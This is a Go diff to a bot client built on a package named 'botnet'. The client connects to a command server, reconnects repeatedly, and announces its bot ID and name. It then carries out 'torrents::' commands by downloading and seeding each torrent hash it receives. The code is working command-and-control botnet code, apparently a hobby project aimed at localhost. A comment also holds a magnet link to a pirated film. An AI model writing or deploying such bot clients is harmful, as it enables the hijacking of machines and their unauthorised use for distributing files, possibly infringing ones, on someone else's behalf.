@@ -2,13 +2,10 @@ package main
 
 import (
 	"bufio"
+	"fmt"
 	"net"
 	"net/textproto"
-	"time"
-
-	"encoding/json"
-
-	"fmt"
+	"strings"
 
 	"github.com/vincentdc94/botnet"
 )
@@ -16,18 +13,20 @@ import (
 var starterPort = 50007
 
 func main() {
-	connectionHandler()
+	connectionHandler(false)
 }
 
-func connectionHandler() {
-	conn, err := net.Dial("tcp", "127.0.0.1:1337")
+func connectionHandler(reconnect bool) {
+	if reconnect {
+		fmt.Println("attempting reconnect")
+	}
 
-	defer connectionHandler()
-	defer time.Sleep(time.Second * 3)
-	defer conn.Close()
+	conn, connErr := net.Dial("tcp", "127.0.0.1:1337")
 
-	if err != nil {
-		//handle error
+	defer connectionHandler(true)
+
+	if connErr == nil && reconnect == true {
+		fmt.Println("reconnect successful")
 	}
 
 	writer := bufio.NewWriter(conn)
@@ -36,33 +35,54 @@ func connectionHandler() {
 	reader := bufio.NewReader(conn)
 	tpr := textproto.NewReader(reader)
 
-	tpw.PrintfLine("do_torrent")
+	tpw.PrintfLine("botid::" + botnet.GetUniqueID())
+	tpw.PrintfLine("botid::" + botnet.GetName())
+	tpw.PrintfLine("notification::Bot " + botnet.GetName() + " with unique identifier " + botnet.GetUniqueID() + " has connected")
 
 	for {
 
-		line, err := tpr.ReadLine()
+		message, readErr := tpr.ReadLine()
 
-		var torrentData botnet.TorrentData
-
-		err = json.Unmarshal([]byte(line), &torrentData)
-
-		if err != nil {
+		if readErr != nil {
+			fmt.Println("Error reading connection stream")
 			break
 		}
+
+		//var torrentData botnet.TorrentData
+
+		//jsonErr := json.Unmarshal([]byte(line), &torrentData)
+
+		receivedMessage := strings.Split(message, "::")
+
+		fmt.Printf("message received: %s\n", message)
+
+		command := receivedMessage[0]
+
+		if command == "torrents" {
+			torrentHashes := strings.Split(receivedMessage[1], ",")
+
+			for _, hash := range torrentHashes {
+				tpw.PrintfLine("[+] Downloading and seeding torrent: " + hash)
+
+				_, torrentErr := botnet.DoTorrent("magnet:?xt=urn:btih:"+hash, starterPort)
+
+				if torrentErr != nil {
+					fmt.Println("Error reading torrent")
+				}
+
+				starterPort++
+			}
+
+		}
+
+		// if jsonErr != nil {
+		// 	fmt.Println("Error reading json data")
+		// }
 		//magnet:?xt=urn:btih:QWG6DKIF4HKBWN3T6JTXE5UTNTQLNALN&dn=Snowden+(2016)+720p+BrRip+x264+YIFY&tr=udp://tracker.zer0day.to:1337/announce&tr=udp://tracker.coppersurfer.tk:6969/announce&tr=udp://mgtracker.org:6969/announce&tr=udp://tracker.leechers-paradise.org:6969/announce&tr=udp://tracker.sktorrent.net:6969/announce&tr=udp://explodie.org:6969/announce
 
-		torrent, err := botnet.DoTorrent("magnet:?xt=urn:btih:"+torrentData.Hash, starterPort)
+		/*torrent, torrentErr := botnet.DoTorrent("magnet:?xt=urn:btih:"+torrentData.Hash, starterPort)*/
 
-		if err != nil {
-			break
-		}
-
-		for {
-			fmt.Println(torrent.Progress)
-			time.Sleep(time.Second)
-		}
-
-		starterPort++
+		//fmt.Println(torrent.Progress)
 
 	}
 
